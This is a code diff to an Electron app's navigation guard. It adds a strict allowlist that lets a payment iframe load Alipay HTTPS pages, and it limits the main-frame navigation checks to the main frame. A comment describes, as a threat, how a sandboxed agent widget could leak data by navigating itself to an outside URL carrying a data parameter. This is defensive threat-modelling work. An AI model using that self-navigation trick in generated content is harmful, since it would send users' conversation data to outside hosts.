@@ -47,6 +47,22 @@ function createAppUrlCheck({ isPackaged, frontendUrl, distDir }) {
 }
 
 /**
+ * 支付 iframe 只能跳到支付宝自己的 HTTPS 收银台；不接受相似域名或协议。
+ */
+function isAlipayFrameUrl(raw) {
+  try {
+    const url = new URL(String(raw));
+    const host = url.hostname;
+    return url.protocol === "https:" && (
+      host === "alipay.com" || host.endsWith(".alipay.com") ||
+      host === "alipaydev.com" || host.endsWith(".alipaydev.com")
+    );
+  } catch {
+    return false;
+  }
+}
+
+/**
  * 主窗口的主框架只许导航到应用自己的地址。拦下的 http(s) 交给系统浏览器;别的(file:、自定义协议)什么都不做。
  * Electron 25 起这两个事件的第一个参数就是带 `url` 的事件对象,老的第二个参数仍在,两种都认。
  * @param {Pick<Electron.WebContents, "on">} contents
@@ -66,9 +82,15 @@ function guardNavigation(contents, { isAppUrl, openExternal, log = () => undefin
     log(`blocked ${kind} to ${shown}`);
     if (handOff && /^https?:\/\//i.test(url)) openExternal(url);
   };
-  contents.on("will-navigate", (event, url) => block("navigation", event, url, true));
+  contents.on("will-navigate", (event, url) => {
+    if (event?.isMainFrame === false) return;
+    block("navigation", event, url, true);
+  });
   // 重定向不是人点的:拦下就好,不替它开外部浏览器。
-  contents.on("will-redirect", (event, url) => block("redirect", event, url, false));
+  contents.on("will-redirect", (event, url) => {
+    if (event?.isMainFrame === false) return;
+    block("redirect", event, url, false);
+  });
   // **子框架**也只许停在应用地址上,外加 srcdoc / 空白页。眼下唯一的子框架是智能体给的小界面
   // (前端 features/agent/agentWidget.ts):它关在不同源的沙箱里、CSP 断了网,但沙箱拦不住它**导航自己** ——
   // `location = "https://外面?data=…"` 会把它手里的东西(模型写进 HTML 的内容)带出去,也能在对话里换上一张
@@ -77,7 +99,7 @@ function guardNavigation(contents, { isAppUrl, openExternal, log = () => undefin
   contents.on("will-frame-navigate", (event) => {
     if (event?.isMainFrame) return;
     const url = String(event?.url ?? "");
-    if (url === "about:srcdoc" || url === "about:blank") return;
+    if (url === "about:srcdoc" || url === "about:blank" || isAlipayFrameUrl(url)) return;
     block("subframe navigation", event, url, false);
   });
 }
@@ -98,4 +120,4 @@ function createSenderCheck({ isAppUrl, windowOf }) {
   };
 }
 
-module.exports = { createAppUrlCheck, createSenderCheck, guardNavigation };
+module.exports = { createAppUrlCheck, createSenderCheck, guardNavigation, isAlipayFrameUrl };
